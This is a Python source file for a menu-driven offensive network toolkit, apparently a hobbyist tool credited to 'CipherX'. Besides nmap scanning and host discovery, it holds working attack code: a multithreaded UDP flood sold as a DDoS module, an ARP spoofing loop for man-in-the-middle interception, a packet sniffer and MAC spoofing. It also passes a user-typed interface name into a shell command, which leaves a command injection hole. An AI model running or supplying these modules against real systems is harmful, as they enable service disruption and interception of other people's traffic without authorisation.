#!/usr/bin/env python3
import os
import sys
import re
import time
import nmap
import socket
import signal
import logging
import subprocess
import threading
from datetime import datetime
from scapy.all import *
from colorama import Fore, Style, init
init(autoreset=True)

# =====================
# CONFIGURATION
# =====================
CONFIG = {
    'network': {
        'max_threads': 500,
        'request_timeout': 5,
        'sniffer_packets': 100
    },
    'logging': {
        'file': 'security_audit.log',
        'level': logging.INFO,
        'format': '%(asctime)s - %(levelname)s - %(message)s'
    },
    'interface': {
        'valid_mac': r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    }
}

# =====================
# CORE FUNCTIONALITY
# =====================
class NetworkToolkit:
    def __init__(self):
        self.running = True
        self.setup_logging()
        self.check_environment()
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def setup_logging(self):
        logging.basicConfig(
            filename=CONFIG['logging']['file'],
            level=CONFIG['logging']['level'],
            format=CONFIG['logging']['format']
        )
    
    def check_environment(self):
        self.verify_root()
        self.check_dependencies(['nmap', 'hostapd', 'dnsmasq', 'airmon-ng', 'iw'])
    
    def verify_root(self):
        if os.geteuid() != 0:
            sys.exit(f"{Fore.RED}Root privileges required!{Style.RESET_ALL}")
    
    def check_dependencies(self, required):
        missing = [pkg for pkg in required if not self.is_installed(pkg)]
        if missing:
            sys.exit(f"{Fore.RED}Missing: {', '.join(missing)}{Style.RESET_ALL}")
    
    def is_installed(self, pkg):
        return subprocess.run(
            f"command -v {pkg}", 
            shell=True, 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
        ).returncode == 0
    
    def signal_handler(self, signum, frame):
        print(f"\n{Fore.RED}[!] Shutting down...{Style.RESET_ALL}")
        self.running = False
        sys.exit(0)

# =====================
# NETWORK OPERATIONS
# =====================
class SecurityScanner:
    def __init__(self):
        self.nm = nmap.PortScanner()
    
    def comprehensive_scan(self, target):
        self.nm.scan(target, arguments='-T4 -A -v')
        return self.nm
    
    def vulnerability_scan(self, target):
        self.nm.scan(target, arguments='-sV --script=vulners')
        return self.nm

class AttackFramework:
    class DDOS:
        def __init__(self):
            self.active = False
            self.threads = []
        
        def flood(self, target, port):
            while self.active:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.sendto(os.urandom(1024), (target, port))
                except Exception as e:
                    logging.error(f"DDoS Error: {str(e)}")
        
        def start(self, target, port, threads):
            self.active = True
            for _ in range(min(threads, CONFIG['network']['max_threads'])):
                t = threading.Thread(target=self.flood, args=(target, port))
                t.daemon = True
                t.start()
                self.threads.append(t)
        
        def stop(self):
            self.active = False
            for t in self.threads:
                t.join()

    @staticmethod
    def arp_spoof(target_ip, gateway_ip, interface):
        def spoof():
            target_mac = getmacbyip(target_ip)
            gateway_mac = getmacbyip(gateway_ip)
            while True:
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
                time.sleep(2)
        threading.Thread(target=spoof, daemon=True).start()

class ReconnaissanceTools:
    @staticmethod
    def packet_sniffer(interface, count=100):
        packets = sniff(iface=interface, count=count)
        wrpcap('network_capture.pcap', packets)
    
    @staticmethod
    def network_discovery(subnet):
        scanner = nmap.PortScanner()
        scanner.scan(hosts=subnet, arguments='-sn')
        return scanner.all_hosts()

class UtilityTools:
    @staticmethod
    def change_mac(interface, new_mac):
        if not re.match(CONFIG['interface']['valid_mac'], new_mac):
            raise ValueError("Invalid MAC address format")
        subprocess.run(["ifconfig", interface, "down"])
        subprocess.run(["ifconfig", interface, "hw", "ether", new_mac])
        subprocess.run(["ifconfig", interface, "up"])
    
    @staticmethod
    def port_knock(target, ports):
        for port in ports:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect_ex((target, port))
            time.sleep(0.3)

# =====================
# USER INTERFACE
# =====================
class CyberSecurityConsole:
    def __init__(self):
        self.toolkit = NetworkToolkit()
        self.scanner = SecurityScanner()
        self.attacks = AttackFramework()
        self.recon = ReconnaissanceTools()
        self.utils = UtilityTools()
        self.show_banner()
    
    def show_banner(self):
        print(f"""{Fore.RED}
     ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗
    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║  ██║
    ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝███████║
    ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗╚════██║
    ╚██████╗   ██║   ██████╔╝███████╗██║  ██║     ██║
     ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═╝v1.0
        {Style.RESET_ALL}""")

    def main_menu(self):
        while self.toolkit.running:
            print(f"\n{Fore.BLUE}[ CYBER SECURITY TOOLKIT( By CipherX) ]{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}1. Comprehensive Network Scan")
            print("2. Vulnerability Analysis")
            print("3. DDoS Attack Framework")
            print("4. ARP Spoofing Attack")
            print("5. Network Traffic Sniffer")
            print("6. MAC Address Spoofing")
            print("7. Port Knocking Sequence")
            print("8. Network Host Discovery")
            print(f"9. Exit Toolkit{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.CYAN}> Select operation: {Style.RESET_ALL}")
            
            try:
                {
                    '1': self.run_comprehensive_scan,
                    '2': self.run_vulnerability_scan,
                    '3': self.ddos_interface,
                    '4': self.arp_spoof_interface,
                    '5': self.sniffer_interface,
                    '6': self.mac_spoof_interface,
                    '7': self.port_knock_interface,
                    '8': self.host_discovery_interface,
                    '9': self.exit_toolkit
                }[choice]()
            except KeyError:
                print(f"{Fore.RED}Invalid selection!{Style.RESET_ALL}")

    def run_comprehensive_scan(self):
        target = input(f"{Fore.CYAN}Enter target IP/range (e.g., 192.168.1.0/24): {Style.RESET_ALL}")
        result = self.scanner.comprehensive_scan(target)
        print(f"\n{Fore.GREEN}Scan results for {target}:{Style.RESET_ALL}")
        for host in result.all_hosts():
            print(f"\n{Fore.YELLOW}Host: {host}{Style.RESET_ALL}")
            for proto in result[host].all_protocols():
                print(f"Protocol: {proto}")
                ports = result[host][proto].keys()
                for port in ports:
                    state = result[host][proto][port]['state']
                    service = result[host][proto][port].get('name', 'unknown')
                    print(f"Port {port}: {state} ({service})")

    def run_vulnerability_scan(self):
        target = input(f"{Fore.CYAN}Enter target IP/range (e.g., 10.0.0.5): {Style.RESET_ALL}")
        result = self.scanner.vulnerability_scan(target)
        print(f"\n{Fore.GREEN}Vulnerability Report for {target}:{Style.RESET_ALL}")
        for host in result.all_hosts():
            print(f"\n{Fore.YELLOW}Host: {host}{Style.RESET_ALL}")
            for proto in result[host].all_protocols():
                ports = result[host][proto].keys()
                for port in ports:
                    if 'script' in result[host][proto][port]:
                        print(f"\nPort {port} vulnerabilities:")
                        for vuln, desc in result[host][proto][port]['script'].items():
                            print(f"  {Fore.RED}{vuln}:{Style.RESET_ALL} {desc}")

    def ddos_interface(self):
        print(f"\n{Fore.RED}[ DDoS Attack Module ]{Style.RESET_ALL}")
        target = input(f"{Fore.CYAN}Target IP (e.g., 192.168.1.100): {Style.RESET_ALL}")
        port = int(input("Target port (e.g., 80): "))
        threads = int(input("Attack threads (e.g., 100): "))
        
        print(f"{Fore.RED}WARNING: This action may be illegal in your jurisdiction!")
        confirm = input("Confirm launch (y/N): ").lower()
        
        if confirm == 'y':
            attack = self.attacks.DDOS()
            attack.start(target, port, threads)
            input(f"{Fore.YELLOW}Attack running - Press Enter to stop...")
            attack.stop()
            print(f"{Fore.GREEN}Attack terminated{Style.RESET_ALL}")

    def arp_spoof_interface(self):
        print(f"\n{Fore.RED}[ ARP Spoofing Module ]{Style.RESET_ALL}")
        target = input(f"{Fore.CYAN}Target IP (e.g., 192.168.1.5): {Style.RESET_ALL}")
        gateway = input("Gateway IP (e.g., 192.168.1.1): ")
        interface = input("Network interface (e.g., eth0): ")
        
        self.attacks.arp_spoof(target, gateway, interface)
        print(f"{Fore.YELLOW}ARP spoofing started...{Style.RESET_ALL}")

    def sniffer_interface(self):
        print(f"\n{Fore.BLUE}[ Packet Sniffer Module ]{Style.RESET_ALL}")
        interface = input(f"{Fore.CYAN}Network interface (e.g., wlan0): {Style.RESET_ALL}")
        count = int(input("Packets to capture (e.g., 100): ") or 100)
        
        self.recon.packet_sniffer(interface, count)
        print(f"{Fore.GREEN}Captured {count} packets to network_capture.pcap{Style.RESET_ALL}")

    def mac_spoof_interface(self):
        print(f"\n{Fore.BLUE}[ MAC Address Spoofing ]{Style.RESET_ALL}")
        interface = input(f"{Fore.CYAN}Network interface (e.g., eth0): {Style.RESET_ALL}")
        new_mac = input("New MAC address (e.g., 00:11:22:33:44:55): ")
        
        try:
            self.utils.change_mac(interface, new_mac)
            print(f"{Fore.GREEN}MAC address changed successfully!{Style.RESET_ALL}")
            current_mac = subprocess.check_output(f"cat /sys/class/net/{interface}/address", shell=True).decode().strip()
            print(f"New MAC: {current_mac}")
        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

    def port_knock_interface(self):
        print(f"\n{Fore.CYAN}[ Port Knocking ]{Style.RESET_ALL}")
        target = input(f"{Fore.CYAN}Target IP (e.g., 192.168.1.10): {Style.RESET_ALL}")
        ports = input("Port sequence (e.g., 7000,8000,9000): ").split(',')
        
        try:
            port_list = [int(p.strip()) for p in ports]
            self.utils.port_knock(target, port_list)
            print(f"{Fore.GREEN}Port knocking sequence completed!{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Invalid port format!{Style.RESET_ALL}")

    def host_discovery_interface(self):
        print(f"\n{Fore.BLUE}[ Network Discovery ]{Style.RESET_ALL}")
        subnet = input(f"{Fore.CYAN}Enter network (CIDR format e.g., 192.168.1.0/24): {Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}Scanning network...{Style.RESET_ALL}")
        hosts = self.recon.network_discovery(subnet)
        
        print(f"\n{Fore.GREEN}Discovered Hosts:{Style.RESET_ALL}")
        for i, host in enumerate(hosts, 1):
            print(f"{i}. {host}")

    def exit_toolkit(self):
        print(f"\n{Fore.RED}Shutting down CyberForge...{Style.RESET_ALL}")
        self.toolkit.running = False
        sys.exit(0)

# =====================
# INITIALIZATION
# =====================
if __name__ == "__main__":
    console = CyberSecurityConsole()
    console.main_menu()